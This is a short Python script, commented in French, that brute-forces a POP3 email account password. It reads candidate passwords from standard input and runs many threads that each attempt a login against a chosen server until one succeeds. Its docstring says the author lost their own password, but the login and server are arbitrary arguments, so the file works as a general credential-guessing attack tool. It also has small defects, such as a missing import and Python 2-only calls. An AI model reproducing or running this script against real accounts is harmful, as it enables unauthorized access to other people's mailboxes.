#!/usr/bin/python
#-*- encoding:utf-8 -*-

import poplib
from sys import stdin as i
from sys import argv 
from socket import error
from time import sleep
from threading import Thread, RLock

"""
j'ai perdu mon mot de passe chez free, meme si le script
n'est pas efficace et que je ne risque pas de le retrouver
cela me defoule.
"""

trouve = False
position = 0
debut = 1452841 
# 185525

user=argv[1]
if not user:
    print("le premier argument doit etre le login")
    sys.exit(2)

server=argv[2]
if not server:
    print("le deuxieme argument doit etre le serveur")
    sys.exit(2)

taille=int(argv[3])
if not taille:
    print("le troisieme argument doit etre la taille du mot de passe")
    sys.exit(2)

maxThread=int(argv[4])
if not maxThread:
    print("le quatrieme argument doit etre le nombre de thread")
    sys.exit(2)

position=0
debut=0

debut=int(argv[5])
if not debut:
    print("le sixieme argument doit etre l'offset dans le fichier de mot de passe")
    sys.exit(2)

print('commencement à %d' % (debut))

verrouLecture = RLock()
verrouTrouve = RLock()
verrouPass = RLock()

passTouve = None

def inc():
    global position
    position += 1

def next_pass():
    with verrouLecture:
        p = i.read(taille)
        if(p):
            inc()
        return p

def isTrouve():
    with verrouTrouve:
        global trouve
        return trouve

def setTrouve(p):
    with verrouTrouve:
        global trouve
        trouve=True
        global passTouve
        passTouve = p

class TestConnecion(Thread):
    def __init__(self):
        Thread.__init__(self)
        self._end = False
        self._password = None
        self._stop = False
        
    def run(self):
        self.mock()

    def isEnd(self):
        return self._end

    def password(self):
        return self._password

    def isTouve(self):
        return self._password != None

    def testSimple(self, p):
        if p == '9':
            self._password=p
            return True
        return False

    def stop(self):
        self._stop = True

    def mock(self):
        p = next_pass()
        while(not isTrouve() and not self._stop):
            if(not p):
                # on arrive a la fin.
                self._end = True
                return
            # on recherche.
            if(self.testFree(p)):
                return
            
            p = next_pass()
    
    def testFree(self, p):
        try:
            M = poplib.POP3(server)
            M.set_debuglevel(0)
            M.user(user)
            try:
                M.pass_(p)
                self._password=p
                return True
            except Exception as e:
                return False
            finally:
                M.quit()
        except error as x:
            sleep(60.0)
            return False

threads = []

while(position<debut):
    next_pass()    

print("commencement a la position " + str(position))

for a in xrange(maxThread):
    t = TestConnecion()
    threads.append(t)
    t.start()

while(True):
    for a in threads:
        if a.isTouve():
            setTrouve(a.password())
    if(isTrouve()):
        for a in threads:
            a.stop()
    e = 0
    for a in threads:
        e += 0 if a.isEnd() else 1
    if(e==0):
        print("fin des mots de passe")
        break
    if(isTrouve()):
        print("mot de passe = " + passTouve)
        break
    else:
        print("position approximative = " + str(position))
        sleep(10)
